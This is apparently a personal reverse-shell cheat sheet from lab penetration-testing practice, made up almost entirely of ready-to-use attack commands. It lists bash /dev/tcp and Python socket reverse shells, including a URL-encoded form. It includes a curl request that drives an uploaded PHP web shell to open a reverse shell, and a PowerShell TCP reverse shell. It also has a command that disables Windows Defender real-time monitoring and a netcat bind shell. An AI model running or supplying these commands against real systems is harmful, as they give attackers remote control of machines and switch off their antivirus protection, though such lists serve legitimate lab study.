## Linux
```bash
'bash -c "bash -i >& /dev/tcp/YOUR_IP}/333 0>&1"'
/bin/bash -c "bash -i >& /dev/tcp/YOUR_IP/333 0>&1"
/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.8/333 0>&1'
%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.8%2F333%200%3E%261'
/bin/bash -c 'python3 -c '\''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("YOUR_IP",333)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/sh")'\'''
curl "http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/08/ptxmumreviurhcn-1787847712.3074.php?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.229\",333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import+pty;pty.spawn(\"/bin/bash\")'"
```
## Windows
```cmd
C:\Users\htb-student\Desktop> Powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.151',333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
PS C:\Users\htb-student> $client = New-Object System.Net.Sockets.TCPClient('10.10.14.151',333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
#### Disable AV window
```powershell
# as admin
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

```bash
# Binding a Bash shell to the TCP session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```